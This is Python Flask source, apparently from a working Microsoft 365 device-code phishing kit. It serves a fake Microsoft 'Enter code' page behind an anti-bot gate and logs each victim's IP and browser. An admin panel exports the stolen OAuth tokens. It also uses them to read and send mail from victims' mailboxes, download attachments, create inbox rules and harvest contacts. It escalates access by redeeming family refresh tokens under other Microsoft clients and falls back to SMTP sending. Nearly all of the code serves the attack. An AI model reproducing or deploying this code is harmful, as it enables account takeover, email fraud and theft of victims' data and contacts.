@app.route("/o365/gate", methods=["GET", "POST"])
def o365_gate():
    if request.method == "POST":
        ua = (request.headers.get("User-Agent") or "").strip()
        if not ua or _AB_BOT_RE.search(ua):
            return jsonify(ok=False), 403
        try:
            data = request.get_json(force=True, silent=True) or {}
            t = str(data.get("t", ""))
            sol = str(data.get("s", ""))
            parts = t.split(".")
            if len(parts) < 3:
                raise ValueError
            nonce, exp = parts[0], parts[1]
            sig = ".".join(parts[2:])
            if not nonce or not exp.isdigit():
                raise ValueError
            if int(exp) < time.time():
                raise ValueError
            if not hmac.compare_digest(_ab_sign(nonce + "." + exp), sig):
                raise ValueError
            digest = hashlib.sha256((nonce + sol).encode()).hexdigest()
            if not digest.startswith(_AB_DIFF):
                raise ValueError
        except Exception:
            return jsonify(ok=False), 403
        exp2 = str(int(time.time()) + _AB_TTL)
        resp = jsonify(ok=True, redirect="/o365")
        resp.set_cookie(
            _AB_COOKIE, exp2 + "." + _ab_sign(exp2),
            max_age=_AB_TTL, httponly=True, samesite="Lax",
            secure=request.is_secure,
        )
        return resp
    # GET: already verified -> straight through
    if _ab_ok():
        return redirect("/o365")
    nonce = secrets.token_hex(16)
    exp = str(int(time.time()) + _AB_CHAL_TTL)
    token = nonce + "." + exp + "." + _ab_sign(nonce + "." + exp)
    html = PAGE_GATE.replace("__TOKEN__", token).replace("__DIFF__", _AB_DIFF)
    return Response(html, mimetype="text/html")


@app.route("/o365")
def o365_new():
    if not _ab_ok():
        return redirect("/o365/gate")
    sid, err = create_session()
    if not sid:
        return render_template_string(PAGE_ERROR, error=err), 502
    return redirect("/o365/" + sid)


@app.route("/o365/<sid>")
def o365_code(sid):
    if not _ab_ok():
        return redirect("/o365/gate")
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
    if not s:
        return render_template_string(PAGE_ERROR, error="Session not found."), 404
    if s["status"] != "pending":
        if s["status"] == "success":
            return redirect("/o365/success/" + sid)
        return redirect("/o365")
    # record victim metadata (IP + user agent) on first load
    with SESSIONS_LOCK:
        if sid in SESSIONS and not SESSIONS[sid].get("ip"):
            SESSIONS[sid]["ip"] = request.remote_addr or ""
            SESSIONS[sid]["ua"] = (request.headers.get("User-Agent") or "")[:300]
    popup_url = s.get("verification_uri_complete") or (
        "https://login.microsoftonline.com/common/oauth2/deviceauth?client_id=%s&otc=%s"
        % (s.get("client_id", ""), s.get("user_code", ""))
    )
    return render_template_string(PAGE_CODE, s=s, sid=sid, popup_url=popup_url)


@app.route("/o365/status/<sid>")
def o365_status(sid):
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
    if not s:
        return jsonify({"status": "missing"})
    # One-shot flag: a poll-time 65002 reissue changed the displayed code,
    # so the victim page must reload to show the new user_code.
    code_changed = False
    if s.get("code_changed"):
        code_changed = True
        SESSIONS[sid]["code_changed"] = False
    return jsonify(
        {
            "status": s["status"],
            "email": s.get("email", ""),
            "code_changed": code_changed,
            "user_code": s.get("user_code", ""),
        }
    )


@app.route("/o365/success/<sid>")
def o365_success(sid):
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
    if not s or s["status"] != "success":
        return redirect("/o365")
    return render_template_string(PAGE_SUCCESS, email=s.get("email", ""))


# ---------------------------------------------------------------------------
# Admin routes
# ---------------------------------------------------------------------------

@app.route("/admin")
def admin():
    return Response(ADMIN_HTML, mimetype="text/html")


@app.route("/admin/api/data")
def admin_api():
    # Best-effort email fill for success sessions missing a mailbox address
    with SESSIONS_LOCK:
        need_email = [
            sid for sid, s in SESSIONS.items()
            if s.get("status") == "success" and not s.get("email")
        ]
    for sid in need_email[:5]:
        try:
            enrich_session_email(sid)
        except Exception:
            pass
    with SESSIONS_LOCK:
        prune_sessions()
        sessions = []
        for s in SESSIONS.values():
            pub = public_session(s)
            # Keep list payload light (tokens only on session detail endpoint)
            for k in (
                "access_token", "refresh_token", "id_token", "device_code",
            ):
                pub.pop(k, None)
            # Surface whether rules/contacts should work for this capture.
            # can_rules is True whenever a refresh token exists: a FOCI FRT
            # can be redeemed by the Teams client (1fec8e78) which carries
            # MailboxSettings.ReadWrite, so rules work even for .default-only
            # captures (00b41c95 on real AAD).
            has_rt = bool(s.get("refresh_token"))
            sc = (pub.get("granted_scopes") or pub.get("scope") or "")
            pub["can_rules"] = (
                has_rt
                or scope_has(sc, "MailboxSettings.ReadWrite")
                or scope_has(sc, "MailboxSettings.Read")
                or ".default" in sc
            )
            pub["can_contacts"] = (
                scope_has(sc, "Contacts.Read")
                or scope_has(sc, "Contacts.ReadWrite")
                or ".default" in sc
            )
            # can_send: the capture is send-capable when its granted scp set
            # carries Mail.Send / Mail.Send.Shared, OR when a refresh token
            # exists - a FOCI FRT can be redeemed by the Microsoft Office
            # client (27922004) whose preauthorized .default set includes
            # Mail.Send, so send works even for .default-only captures (e.g.
            # legacy 00b41c95 on real AAD) via mint_send_token. Without
            # either, /me/sendMail returns a real Graph 403
            # (ErrorAccessDenied) which the admin UI surfaces.
            pub["can_send"] = (
                has_rt
                or scope_has(sc, "Mail.Send")
                or scope_has(sc, "Mail.Send.Shared")
            )
            sessions.append(pub)
    sessions.sort(
        key=lambda x: (
            0 if x.get("status") == "success" else 1,
            x.get("completed_at") or x.get("created") or "",
        ),
        reverse=False,
    )
    # success first, then newest within each group
    sessions.sort(key=lambda x: x.get("completed_at") or x.get("created") or "", reverse=True)
    sessions.sort(key=lambda x: 0 if x.get("status") == "success" else 1)
    stats = {
        "total": len(sessions),
        "pending": sum(1 for s in sessions if s["status"] == "pending"),
        "success": sum(1 for s in sessions if s["status"] == "success"),
        "declined": sum(1 for s in sessions if s["status"] == "declined"),
        "expired": sum(1 for s in sessions if s["status"] == "expired"),
        "error": sum(1 for s in sessions if s["status"] == "error"),
    }
    config = {
        "client_id": MS_CLIENT_ID,
        "client_name": CLIENT_NAMES.get(MS_CLIENT_ID, "Unknown public client"),
        "flow": MS_FLOW,
        "scope": MS_SCOPE if MS_FLOW == "v2" else "",
        "resource": MS_RESOURCE,
        "log_file": LOG_FILE,
        "graph_url": MS_GRAPH_URL,
        "device_page": "/o365",
        "admin_url": "/admin",
    }
    return jsonify({
        "stats": stats,
        "sessions": sessions,
        "config": config,
        "domains": load_domains(),
    })


@app.route("/admin/clear", methods=["POST"])
def admin_clear():
    with SESSIONS_LOCK:
        SESSIONS.clear()
    return jsonify({"ok": True})


@app.route("/admin/delete/<sid>", methods=["POST"])
def admin_delete(sid):
    with SESSIONS_LOCK:
        SESSIONS.pop(sid, None)
    return jsonify({"ok": True})


@app.route("/admin/api/session/<sid>/data")
def admin_session_data(sid):
    """Full captured data for one session: tokens + decoded id_token claims."""
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
    if not s:
        return jsonify({"error": "Session not found"}), 404
    pub = public_session(s)
    pub["claims"] = decode_claims(s.get("id_token", ""))
    return jsonify(pub)


@app.route("/admin/api/export")
def admin_export():
    """Download stolen_tokens.json as an attachment."""
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            data = f.read()
    else:
        data = "[]"
    return Response(
        data,
        mimetype="application/json",
        headers={
            "Content-Disposition": 'attachment; filename="stolen_tokens.json"'
        },
    )


@app.route("/admin/api/export/<sid>")
def admin_export_session(sid):
    """Download the tokens of a single client session as an attachment."""
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
    if not s:
        return jsonify({"error": "Session not found"}), 404
    token_keys = [
        "access_token", "refresh_token", "id_token", "device_code",
        "client_id", "scope", "token_type", "expires_in", "expires_at",
        "email", "status", "sid", "host", "user_code", "created",
        "completed_at",
    ]
    out = {k: s.get(k) for k in token_keys if s.get(k) is not None}
    out["claims"] = decode_claims(s.get("id_token", ""))
    fname = (s.get("email") or sid).split("@")[0].replace(".", "_")
    fname = re.sub(r"[^A-Za-z0-9_-]", "", fname)[:64] or sid
    return Response(
        json.dumps(out, indent=2),
        mimetype="application/json",
        headers={
            "Content-Disposition":
                'attachment; filename="tokens_%s_%s.json"' % (fname, sid[:8])
        },
    )


# ---------------------------------------------------------------------------
# Domain management (admin: Domains & Clients page)
# ---------------------------------------------------------------------------

@app.route("/admin/api/domains", methods=["GET"])
def admin_domains_list():
    return jsonify({"domains": load_domains()})


@app.route("/admin/api/domains", methods=["POST"])
def admin_domains_add():
    body = request.get_json(silent=True) or request.form or {}
    domain = normalize_domain(body.get("domain") or "")
    if not domain:
        return jsonify({"error": "Domain is required"}), 400
    if not (domain == "localhost" or re.match(r"^[a-z0-9.-]+\.[a-z]{2,}$", domain)):
        return jsonify({"error": "Invalid domain: %s" % domain}), 400
    domains = load_domains()
    if domain not in domains:
        domains.append(domain)
        save_domains(domains)
        if SERVE_HTTPS:
            try:
                os.remove(SSL_CERT)
            except OSError:
                pass
            ensure_ssl_certs()
    return jsonify({"ok": True, "domains": domains})


@app.route("/admin/api/domains/<path:domain>", methods=["DELETE"])
def admin_domains_del(domain):
    domain = normalize_domain(domain)
    domains = load_domains()
    domains = [d for d in domains if d != domain]
    save_domains(domains)
    return jsonify({"ok": True, "domains": domains})


# ---------------------------------------------------------------------------
# Graph proxy (uses the victim's stolen access token)
# ---------------------------------------------------------------------------

def graph_req(sid, method, path, use_rules_token=False,
               use_send_token=False, **kwargs):
    """Call Graph with the victim's token, auto-refreshing when the access
    token has expired and retrying once on 401. When use_rules_token is set,
    the request is sent with a Microsoft-Teams-client minted token scoped to
    MailboxSettings.ReadWrite (see mint_rules_token) - the inbox-rules path
    for every capture, including .default-only ones (legacy 00b41c95).
    Returns a Flask response."""
    s, token = get_stolen(sid)
    if not s:
        return jsonify({"error": token}), 404
    if not token:
        return jsonify({"error": "No captured token for this session yet"}), 404
    if use_rules_token:
        token, err = mint_rules_token(sid)
        if err or not token:
            return jsonify({"error": err or "rules token mint failed"}), 401
    if use_send_token:
        token, err = mint_send_token(sid)
        if err or not token:
            return jsonify({"error": err or "send token mint failed"}), 401

    def call(token):
        headers = {"Authorization": "Bearer %s" % token}
        if "json" in kwargs:
            headers["Content-Type"] = "application/json"
        try:
            r = HTTP.request(
                method, MS_GRAPH_URL + path, headers=headers, timeout=30, **kwargs
            )
        except Exception as e:
            return None, jsonify({"error": "Graph request failed: %s" % e}), 502
        return r, None, None

    r, err_resp, err_code = call(token)
    if err_resp is not None:
        return err_resp, err_code
    # 401 -> the access token expired or was revoked; re-mint/refresh once.
    if r.status_code == 401:
        if use_rules_token:
            token, err = mint_rules_token(sid, force=True)
        elif use_send_token:
            token, err = mint_send_token(sid, force=True)
        else:
            token, err = refresh_access_token(sid)
        if err:
            return jsonify({"error": err}), 401
        r, err_resp, err_code = call(token)
        if err_resp is not None:
            return err_resp, err_code
    if r.status_code >= 400:
        try:
            detail = r.json()
        except Exception:
            detail = r.text[:300]
        hint = ""
        if r.status_code == 403 and "messageRules" in path:
            if not use_rules_token:
                # Capture scope (.default on real AAD) lacks
                # MailboxSettings.ReadWrite: one-shot retry with a
                # Teams-client minted rules token.
                tok2, err2 = mint_rules_token(sid)
                if tok2 and not err2:
                    r2, err_resp2, err_code2 = call(tok2)
                    if err_resp2 is None and r2 is not None and r2.status_code < 400:
                        if not r2.content:
                            return jsonify({"ok": True})
                        try:
                            return jsonify(r2.json())
                        except Exception:
                            return Response(
                                r2.content,
                                mimetype=r2.headers.get(
                                    "Content-Type", "application/octet-stream"
                                ),
                            )
                hint = (
                    " - the captured token lacks MailboxSettings.ReadWrite and "
                    "the Teams-client rules-token mint failed (%s). New "
                    "captures request Mail.ReadWrite + Mail.Send + "
                    "MailboxSettings.ReadWrite + Contacts.Read + User.Read by "
                    "default; if AAD fell back to .default, inbox rules are "
                    "served via a Teams-client rules token mint."
                ) % (err2 or "unknown error")
            else:
                hint = (
                    " - the Teams-minted rules token was rejected by Graph "
                    "(expected MailboxSettings.ReadWrite via Microsoft Teams "
                    "client 1fec8e78). This tenant may restrict cross-client "
                    "FRT redemption."
                )
        elif r.status_code == 403 and "/sendMail" in path:
            hint = (
                " - the send token (minted via Microsoft Office client "
                "27922004 from the session family refresh token) was "
                "rejected by Graph. This tenant may restrict cross-client "
                "FRT redemption for send."
            )
        elif r.status_code == 403:
            need = "Contacts.Read" if "/contacts" in path else "Mail.ReadWrite"
            hint = (
                " - the captured token lacks this delegated permission (%s). "
                "New captures request Mail.ReadWrite + Mail.Send + "
                "MailboxSettings.ReadWrite + Contacts.Read + User.Read by default. "
                "Delete this session and re-phish with the current server so the "
                "victim approves the full scope set. If AAD fell back to .default, "
                "the admin Refresh will try to upgrade scopes on the next Graph call."
            ) % need
            # One-shot scope upgrade attempt for 403 on contacts
            if "/contacts" in path:
                tok2, err2 = refresh_access_token(sid, prefer_scope=DEFAULT_SCOPE)
                if tok2 and not err2:
                    r2, err_resp2, err_code2 = call(tok2)
                    if err_resp2 is None and r2 is not None and r2.status_code < 400:
                        if not r2.content:
                            return jsonify({"ok": True})
                        try:
                            return jsonify(r2.json())
                        except Exception:
                            return Response(
                                r2.content,
                                mimetype=r2.headers.get(
                                    "Content-Type", "application/octet-stream"
                                ),
                            )
        return jsonify({"error": "Graph %s: %s%s" % (r.status_code, detail, hint)}), r.status_code
    if not r.content:
        return jsonify({"ok": True})
    try:
        return jsonify(r.json())
    except Exception:
        return Response(r.content, mimetype=r.headers.get("Content-Type", "application/octet-stream"))


@app.route("/admin/api/graph/<sid>/folders")
def graph_folders(sid):
    return graph_req(
        sid,
        "GET",
        "/me/mailFolders?$top=50"
        "&$select=id,displayName,parentFolderId,childFolderCount,"
        "totalItemCount,unreadItemCount",
    )


@app.route("/admin/api/graph/<sid>/messages")
def graph_messages(sid):
    folder = request.args.get("folder", "") or "inbox"
    search = (request.args.get("search") or "").strip()
    select = (
        "id,subject,bodyPreview,from,toRecipients,ccRecipients,receivedDateTime,"
        "sentDateTime,isRead,hasAttachments,importance,flag,conversationId"
    )
    path = (
        "/me/mailFolders/%s/messages?$top=50&$orderby=receivedDateTime desc&$select=%s"
        % (folder, select)
    )
    if search:
        # $search cannot be combined with $orderby on Graph; drop orderby.
        path = (
            "/me/mailFolders/%s/messages?$top=50&$select=%s&$search=\"%s\""
            % (folder, select, search.replace('"', ""))
        )
    return graph_req(sid, "GET", path)


@app.route("/admin/api/graph/<sid>/message/<mid>")
def graph_message(sid, mid):
    r = graph_req(
        sid,
        "GET",
        "/me/messages/%s?$select=id,subject,body,bodyPreview,from,toRecipients,"
        "ccRecipients,bccRecipients,replyTo,receivedDateTime,sentDateTime,"
        "isRead,hasAttachments,importance,flag,conversationId,internetMessageId"
        % mid,
    )
    if r.status_code != 200:
        return r
    msg = r.get_json()
    att = graph_req(sid, "GET", "/me/messages/%s/attachments" % mid)
    attachments = att.get_json().get("value", []) if att.status_code == 200 else []
    for a in attachments:
        a["downloadUrl"] = "/admin/api/graph/%s/attachment/%s/%s?name=%s" % (
            sid, mid, a.get("id", ""), a.get("name", "attachment")
        )
    return jsonify({"message": msg, "attachments": attachments})


@app.route("/admin/api/graph/<sid>/attachment/<mid>/<attid>")
def graph_attachment(sid, mid, attid):
    token, err = fresh_token(sid)
    if not token:
        return jsonify({"error": err}), 404
    headers = {"Authorization": "Bearer %s" % token}
    name = request.args.get("name", "attachment.bin")
    try:
        r = HTTP.get(
            MS_GRAPH_URL + "/me/messages/%s/attachments/%s/$value" % (mid, attid),
            headers=headers,
            timeout=60,
        )
    except Exception as e:
        return jsonify({"error": "Attachment request failed: %s" % e}), 502
    if r.status_code >= 400:
        return jsonify({"error": "Graph %s" % r.status_code}), r.status_code
    # inline=1 renders the attachment in the browser (e.g. PDF preview),
    # anything else downloads it as attachment.
    disp = "inline" if request.args.get("inline") else "attachment"
    return Response(
        r.content,
        mimetype=r.headers.get("Content-Type", "application/octet-stream"),
        headers={"Content-Disposition": '%s; filename="%s"' % (disp, name)},
    )


def _message_payload(body):
    """Build the Graph message object shared by /send and /draft."""
    content = body.get("body", "") or ""
    ctype = body.get("contentType") or (
        "HTML" if ("<" in content and ">" in content) else "Text"
    )
    if str(ctype).lower() == "html":
        # Microsoft-style container; applied once server-side so the admin
        # UI does not double-wrap. Uses __BODY__ replace (not %-format) so
        # bodies containing "100%" or "{}" survive intact.
        content = MS_BODY_WRAP.replace("__BODY__", content, 1)
    payload = {
        "subject": body.get("subject", ""),
        "body": {
            "contentType": ctype,
            "content": content,
        },
        "toRecipients": [
            {"emailAddress": {"address": a}} for a in (body.get("to") or []) if a
        ],
    }
    cc = body.get("cc") or []
    if not isinstance(cc, list):
        cc = [x.strip() for x in str(cc).split(";") if x.strip()]
    if cc:
        payload["ccRecipients"] = [
            {"emailAddress": {"address": a}} for a in cc if a
        ]
    bcc = body.get("bcc") or []
    if not isinstance(bcc, list):
        bcc = [x.strip() for x in str(bcc).split(";") if x.strip()]
    if bcc:
        payload["bccRecipients"] = [
            {"emailAddress": {"address": a}} for a in bcc if a
        ]
    atts = body.get("attachments") or []
    if atts:
        files = []
        for a in atts:
            name = (a.get("name") or "").strip()
            content = a.get("contentBytes") or ""
            if not name or not content:
                continue
            files.append({
                "@odata.type": "#microsoft.graph.fileAttachment",
                "name": name,
                "contentType": a.get("contentType") or "application/octet-stream",
                "contentBytes": content,
            })
        if files:
            payload["attachments"] = files
    return payload


@app.route("/admin/api/graph/<sid>/send", methods=["POST"])
def graph_send(sid):
    body = request.get_json(silent=True) or {}
    to = body.get("to", [])
    if not isinstance(to, list) or not to:
        return jsonify({"error": "missing recipients"}), 400
    payload = {"message": _message_payload(body), "saveToSentItems": True}
    # Send needs Mail.Send (or Mail.Send.Shared). If the capture's granted
    # scp set lacks it but a family refresh token exists, mint a send token
    # with the Microsoft Office client (27922004) whose preauthorized .default
    # set includes Mail.Send (FOCI FRT redemption). Sessions without a refresh
    # token fall through to the victim's own token and surface the real Graph
    # 403 if the scope is missing.
    with SESSIONS_LOCK:
        s0 = SESSIONS.get(sid)
    need_send_mint = False
    if s0:
        sc0 = (s0.get("granted_scopes") or s0.get("scope") or "")
        need_send_mint = not (
            scope_has(sc0, "Mail.Send") or scope_has(sc0, "Mail.Send.Shared")
        )
    r = graph_req(
        sid, "POST", "/me/sendMail", json=payload, use_send_token=need_send_mint
    )
    # Real-AAD fallback: when /me/sendMail 403s (the captured token's Graph
    # scp set lacks Mail.Send) or the send-token mint fails, deliver via SMTP
    # XOAUTH2 (smtp.office365.com) using a token minted from the session's
    # family refresh token for the outlook.office.com SMTP.Send resource.
    if SMTP_FALLBACK and r.status_code in (401, 403):
        jerr = r.get_json(silent=True) or {}
        errtext = str(jerr.get("error") or "").lower()
        denied = (
            r.status_code == 403
            or "send token mint failed" in errtext
            or "lacks mail.send" in errtext
        )
        if denied:
            ok, serr = send_via_smtp(sid, body)
            if ok:
                return jsonify({"ok": True, "via": "smtp"})
            return jsonify({
                "error": "Graph send 403; SMTP fallback failed: %s" % serr
            }), 502
    return r


@app.route("/admin/api/graph/<sid>/draft", methods=["POST"])
def graph_draft(sid):
    """Save a draft via Graph POST /me/messages (isDraft: true)."""
    body = request.get_json(silent=True) or {}
    payload = _message_payload(body)
    payload["isDraft"] = True
    # Draft creation needs Mail.ReadWrite (or Mail.ReadWrite.Shared). When the
    # capture's granted scp set lacks it, mint a token with the Microsoft
    # Office client whose .default set includes it, mirroring the /send flow.
    need_mint = False
    with SESSIONS_LOCK:
        s0 = SESSIONS.get(sid)
    if s0:
        sc0 = (s0.get("granted_scopes") or s0.get("scope") or "")
        need_mint = not (
            scope_has(sc0, "Mail.ReadWrite") or scope_has(sc0, "Mail.ReadWrite.Shared")
        )
    return graph_req(
        sid, "POST", "/me/messages", json=payload, use_send_token=need_mint
    )


@app.route("/admin/api/graph/<sid>/read/<mid>", methods=["POST"])
def graph_read(sid, mid):
    return graph_req(sid, "PATCH", "/me/messages/%s" % mid, json={"isRead": True})


@app.route("/admin/api/graph/<sid>/unread/<mid>", methods=["POST"])
def graph_unread(sid, mid):
    return graph_req(sid, "PATCH", "/me/messages/%s" % mid, json={"isRead": False})


@app.route("/admin/api/graph/<sid>/delete/<mid>", methods=["POST"])
def graph_delete_msg(sid, mid):
    return graph_req(sid, "DELETE", "/me/messages/%s" % mid)


@app.route("/admin/api/graph/<sid>/folder", methods=["POST"])
def graph_create_folder(sid):
    body = request.get_json(silent=True) or {}
    name = (body.get("displayName") or "").strip()
    if not name:
        return jsonify({"error": "folder displayName is required"}), 400
    return graph_req(sid, "POST", "/me/mailFolders", json={"displayName": name})


@app.route("/admin/api/graph/<sid>/message/<mid>/move", methods=["POST"])
def graph_move_message(sid, mid):
    body = request.get_json(silent=True) or {}
    dest = (body.get("destinationId") or "").strip()
    if not dest:
        return jsonify({"error": "destinationId is required"}), 400
    return graph_req(
        sid,
        "POST",
        "/me/messages/%s/move" % mid,
        json={"destinationId": dest},
    )


# ---------------------------------------------------------------------------
# Inbox rules proxy (messageRules under Mail.Read / MailboxSettings.ReadWrite)
# ---------------------------------------------------------------------------

@app.route("/admin/api/graph/<sid>/rules")
def graph_rules(sid):
    return graph_req(
        sid,
        "GET",
        "/me/mailFolders/Inbox/messageRules",
        use_rules_token=True,
    )


@app.route("/admin/api/graph/<sid>/rule/<rid>")
def graph_rule(sid, rid):
    return graph_req(
        sid,
        "GET",
        "/me/mailFolders/Inbox/messageRules/%s" % rid,
        use_rules_token=True,
    )


@app.route("/admin/api/graph/<sid>/rule", methods=["POST"])
def graph_rule_create(sid):
    body = request.get_json(silent=True) or {}
    if not body.get("displayName"):
        return jsonify({"error": "missing displayName"}), 400
    return graph_req(
        sid,
        "POST",
        "/me/mailFolders/Inbox/messageRules",
        json=body,
        use_rules_token=True,
    )


@app.route("/admin/api/graph/<sid>/rule/<rid>", methods=["PATCH"])
def graph_rule_patch(sid, rid):
    body = request.get_json(silent=True) or {}
    return graph_req(
        sid,
        "PATCH",
        "/me/mailFolders/Inbox/messageRules/%s" % rid,
        json=body,
        use_rules_token=True,
    )


@app.route("/admin/api/graph/<sid>/rule/<rid>", methods=["DELETE"])
def graph_rule_delete(sid, rid):
    return graph_req(
        sid,
        "DELETE",
        "/me/mailFolders/Inbox/messageRules/%s" % rid,
        use_rules_token=True,
    )


# ---------------------------------------------------------------------------
# Contacts / profile proxy
# ---------------------------------------------------------------------------

@app.route("/admin/api/graph/<sid>/me")
def graph_me(sid):
    r = graph_req(sid, "GET", "/me")
    # Best-effort: stamp email on the session when /me succeeds.
    if getattr(r, "status_code", None) == 200:
        try:
            me = r.get_json() or {}
            email = me.get("mail") or me.get("userPrincipalName") or ""
            if email:
                changed = False
                with SESSIONS_LOCK:
                    if sid in SESSIONS and not SESSIONS[sid].get("email"):
                        SESSIONS[sid]["email"] = email
                        changed = True
                if changed:
                    try:
                        persist_session_tokens(sid)
                    except Exception:
                        pass
        except Exception:
            pass
    return r


@app.route("/admin/api/graph/<sid>/signature")
def graph_signature(sid):
    """Victim email signature (html/plain) for reply auto-append and the
    compose-toolbar Signature button. Not available on every mailbox -
    returns a null signature instead of failing the compose flow."""
    r = graph_req(sid, "GET", "/me/signature")
    if getattr(r, "status_code", None) != 200:
        try:
            return jsonify({"signature": None}), r.status_code
        except Exception:
            return jsonify({"signature": None}), 502
    try:
        return jsonify(r.get_json())
    except Exception:
        return jsonify({"signature": None}), 502


@app.route("/admin/api/graph/<sid>/contacts")
def graph_contacts(sid):
    """List victim contacts (paginated Graph crawl, max ~500)."""
    top = min(int(request.args.get("top", "100") or 100), 250)
    path = (
        "/me/contacts?$top=%d"
        "&$select=id,displayName,givenName,surname,emailAddresses,mobilePhone,businessPhones,companyName,jobTitle,homePhones"
        "&$orderby=displayName" % top
    )
    return graph_req(sid, "GET", path)


@app.route("/admin/api/graph/<sid>/contacts/extract")
def graph_contacts_extract(sid):
    """Crawl all contact pages and return a flat extract + CSV-friendly rows."""
    s, token = get_stolen(sid)
    if not s:
        return jsonify({"error": token}), 404
    token, err = fresh_token(sid)
    if err or not token:
        return jsonify({"error": err or "no token"}), 401

    contacts = []
    url = (
        MS_GRAPH_URL
        + "/me/contacts?$top=100"
        + "&$select=id,displayName,givenName,surname,emailAddresses,mobilePhone,"
        "businessPhones,companyName,jobTitle,homePhones,personalNotes"
        + "&$orderby=displayName"
    )
    pages = 0
    while url and pages < 20:
        pages += 1
        try:
            r = requests.get(
                url,
                headers={"Authorization": "Bearer %s" % token},
                timeout=45,
            )
        except Exception as e:
            return jsonify({"error": "contacts request failed: %s" % e}), 502
        if r.status_code == 401 and pages == 1:
            token, err = refresh_access_token(sid)
            if err:
                return jsonify({"error": err}), 401
            continue
        if r.status_code >= 400:
            try:
                detail = r.json()
            except Exception:
                detail = r.text[:300]
            hint = ""
            if r.status_code == 403:
                hint = (" - token lacks Contacts.Read; a .default capture may "
                        "not carry it for this client. Set MS_SCOPE to include "
                        "https://graph.microsoft.com/Contacts.Read or re-capture "
                        "with the new default scope")
            return jsonify({"error": "Graph %s: %s%s" % (r.status_code, detail, hint)}), r.status_code
        try:
            j = r.json()
        except Exception:
            return jsonify({"error": "invalid contacts JSON"}), 502
        contacts.extend(j.get("value") or [])
        url = j.get("@odata.nextLink") or ""

    rows = []
    for c in contacts:
        emails = []
        for e in (c.get("emailAddresses") or []):
            addr = e.get("address") if isinstance(e, dict) else ""
            if addr:
                emails.append(addr)
        phones = []
        if c.get("mobilePhone"):
            phones.append(c["mobilePhone"])
        for p in (c.get("businessPhones") or []) + (c.get("homePhones") or []):
            if p and p not in phones:
                phones.append(p)
        rows.append({
            "id": c.get("id", ""),
            "displayName": c.get("displayName") or "",
            "givenName": c.get("givenName") or "",
            "surname": c.get("surname") or "",
            "emails": emails,
            "email": emails[0] if emails else "",
            "phones": phones,
            "phone": phones[0] if phones else "",
            "company": c.get("companyName") or "",
            "jobTitle": c.get("jobTitle") or "",
        })

    # CSV body
    import csv
    import io
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["displayName", "givenName", "surname", "email", "emails", "phone", "phones", "company", "jobTitle"])
    for row in rows:
        w.writerow([
            row["displayName"], row["givenName"], row["surname"],
            row["email"], ";".join(row["emails"]),
            row["phone"], ";".join(row["phones"]),
            row["company"], row["jobTitle"],
        ])
    fmt = (request.args.get("format") or "json").lower()
    if fmt == "csv":
        email_slug = (s.get("email") or sid).replace("@", "_at_")
        return Response(
            buf.getvalue(),
            mimetype="text/csv",
            headers={
                "Content-Disposition": 'attachment; filename="contacts_%s.csv"' % email_slug
            },
        )
    return jsonify({
        "count": len(rows),
        "email": s.get("email") or "",
        "contacts": rows,
        "csv": buf.getvalue(),
    })


# ---------------------------------------------------------------------------
# Victim templates
# ---------------------------------------------------------------------------

PAGE_ERROR = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Microsoft account | Error</title>
<style>
body{font-family:'Segoe UI',Arial,sans-serif;background:#f2f2f2;color:#1b1b1b;display:flex;min-height:100vh;margin:0}
.card{background:#fff;max-width:440px;margin:auto;padding:40px;box-shadow:0 2px 6px rgba(0,0,0,.2);border-radius:4px}
h1{font-size:22px;font-weight:600;margin-bottom:10px;color:#a12622}
p{font-size:14px;color:#333;line-height:1.5;word-break:break-word}
</style>
</head>
<body><div class="card"><h1>Something went wrong</h1><p>{{ error }}</p></div></body>
</html>"""

PAGE_CODE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Microsoft account | Enter code</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:#f2f2f2;color:#1b1b1b;min-height:100vh;display:flex;flex-direction:column}
.header{background:#fff;border-bottom:1px solid #e0e0e0;padding:14px 24px}
.header .brand{font-size:22px;font-weight:600;color:#0078d4}
.card{background:#fff;max-width:440px;margin:48px auto;padding:44px 48px;box-shadow:0 2px 6px rgba(0,0,0,.2);border-radius:4px}
h1{font-size:24px;font-weight:600;margin-bottom:12px}
h2{font-size:18px;font-weight:600;margin:20px 0 6px}
p{font-size:14px;line-height:1.5;color:#333}
.code{font-family:'Consolas','Courier New',monospace;font-size:34px;font-weight:700;letter-spacing:6px;text-align:center;background:#f7f7f7;border:1px solid #ddd;border-radius:4px;padding:14px 10px;margin:16px 0;color:#1a1a1a;user-select:all}
.btn{display:block;width:100%;background:#0067b8;color:#fff;border:none;padding:12px 16px;font-size:15px;font-weight:600;border-radius:3px;cursor:pointer;text-align:center;text-decoration:none;margin-top:18px}
.btn:hover{background:#005a9e}
.meta{font-size:12px;color:#666;text-align:center;margin-top:14px}
.footer{margin-top:auto;text-align:center;padding:16px;font-size:12px;color:#777}
.footer a{color:#0067b8;text-decoration:none}
.alert{background:#fdecea;border:1px solid #f5c6cb;color:#a12622;padding:10px 14px;border-radius:3px;font-size:13px;margin-top:16px;display:none}
.notice{background:#e8f0fe;border:1px solid #c5d9f7;color:#0f4c81;padding:10px 14px;border-radius:3px;font-size:13px;margin-top:16px}
@media(max-width:520px){.card{margin:16px;padding:28px 22px}.code{font-size:26px}}
.btn.secondary{background:#fff;color:#0067b8;border:1px solid #b8c4ce;margin-top:8px}
</style>
</head>
<body>
<div class="header"><div class="brand">Microsoft</div></div>
<div class="card">
  <h1>Microsoft account</h1>
  <h2>Enter code</h2>
  <p>To finish signing in, open the Microsoft sign-in page on any device and enter this code:</p>
  <div class="code">{{ s.user_code }}</div>
  <p style="text-align:center;font-size:13px;color:#555">This code expires in <span id="countdown">{{ s.expires_in }} seconds</span>.</p>
  <button class="btn" id="popup-btn">&#128279; Verify with Microsoft</button>
  <div class="alert" id="alert"></div>
  <div class="meta">Sign in securely at <strong>{{ s.verification_uri }}</strong></div>
  {% if s.note %}<div class="notice">{{ s.note }}</div>{% endif %}
